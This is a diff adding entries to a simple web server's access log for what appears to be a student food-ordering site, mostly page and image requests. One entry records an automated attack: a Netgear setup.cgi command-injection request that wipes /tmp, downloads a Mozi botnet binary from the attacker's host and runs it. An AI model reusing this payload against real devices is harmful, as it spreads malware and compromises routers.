@@ -1015,3 +1015,56 @@ Keyboard interrupt received, exiting.
 127.0.0.1 - - [03/Dec/2024 11:42:06] "GET /seasonal_data.html HTTP/1.1" 304 -
 127.0.0.1 - - [03/Dec/2024 11:49:00] "GET /seasonal_data.html HTTP/1.1" 304 -
 127.0.0.1 - - [03/Dec/2024 11:54:56] "GET /seasonal_data.html HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:58:56] "GET /login.html HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:58:58] code 404, message File not found
+117.193.230.12 - - [16/Mar/2025 07:58:58] "GET /favicon.ico HTTP/1.1" 404 -
+117.193.230.12 - - [16/Mar/2025 07:59:12] "GET /First%20Page.html?email=g%40g&password=g HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /First%20Page.css HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%20137.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%20108.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%20103.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%2028.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%20127.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%20148.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:14] "GET /Navbar.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:14] "GET /SEPM%20131.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /Lunch.html HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /order.css HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /Mutton%20Biryani.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /Noorth%20Indian%20Thali2.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /panner2.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /SEPM%20146.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /cart.js HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:17] "GET /SEPM%20143.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:17] "GET /SEPM%20147.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:17] "GET /SEPM%2022.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:17] "GET /Roti1.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:18] "GET /Chicken-Biryani3.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:19] "GET /Jeera%20Rice3.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:20] "GET /Paneer%20Tikka1.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:20] "GET /SEPM%20123.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:23] "GET /Order%20Confirmation.html HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:23] "GET /SEPM%20150.jpg HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:32] "GET /admin.html HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:47] "GET //order_status.html HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 07:59:48] "GET //order_status.html HTTP/1.1" 304 -
+117.193.230.12 - - [16/Mar/2025 08:03:11] "GET //order_status.html HTTP/1.1" 304 -
+117.193.230.12 - - [16/Mar/2025 08:03:12] "GET //order_status.html HTTP/1.1" 304 -
+117.193.230.12 - - [16/Mar/2025 08:04:06] "GET /order_status.html HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 08:04:08] "GET /order_status.html HTTP/1.1" 304 -
+117.193.230.12 - - [16/Mar/2025 08:06:07] "GET /order_status.html HTTP/1.1" 304 -
+117.193.230.12 - - [16/Mar/2025 08:06:09] "GET /order_status.html HTTP/1.1" 304 -
+117.193.230.12 - - [16/Mar/2025 08:06:14] "GET /order_status.html HTTP/1.1" 304 -
+117.193.230.12 - - [16/Mar/2025 08:08:49] "GET /order_status.html HTTP/1.1" 304 -
+117.193.230.12 - - [16/Mar/2025 08:16:06] "GET /order_status.html HTTP/1.1" 304 -
+115.56.148.57 - - [16/Mar/2025 08:17:36] code 404, message File not found
+115.56.148.57 - - [16/Mar/2025 08:17:36] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.56.148.57:60235/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 -
+117.193.230.12 - - [16/Mar/2025 08:20:38] "GET /order_status.html HTTP/1.1" 304 -
+117.193.230.12 - - [16/Mar/2025 08:21:57] "GET /order_status.html HTTP/1.1" 304 -
+185.242.226.10 - - [16/Mar/2025 08:26:10] code 400, message Bad request version ('À\\x14À')
+185.242.226.10 - - [16/Mar/2025 08:26:10] "\x16\x03\x01\x00\x8b\x01\x00\x00\x87\x03\x03;\x18Iøh±¯º:?\x034\x85õ\x92¢?>\x88Ç\x9b¨2Ï/\x1fù\x98\x01Rõ\x89\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
+165.154.202.146 - - [16/Mar/2025 08:26:30] "GET / HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 08:29:54] "GET /order_status.html HTTP/1.1" 304 -
+204.76.203.15 - - [16/Mar/2025 08:33:49] "GET / HTTP/1.1" 200 -
+117.193.230.12 - - [16/Mar/2025 08:36:33] "GET /order_status.html HTTP/1.1" 304 -
+117.193.230.12 - - [16/Mar/2025 08:37:27] "GET /order_status.html HTTP/1.1" 304 -
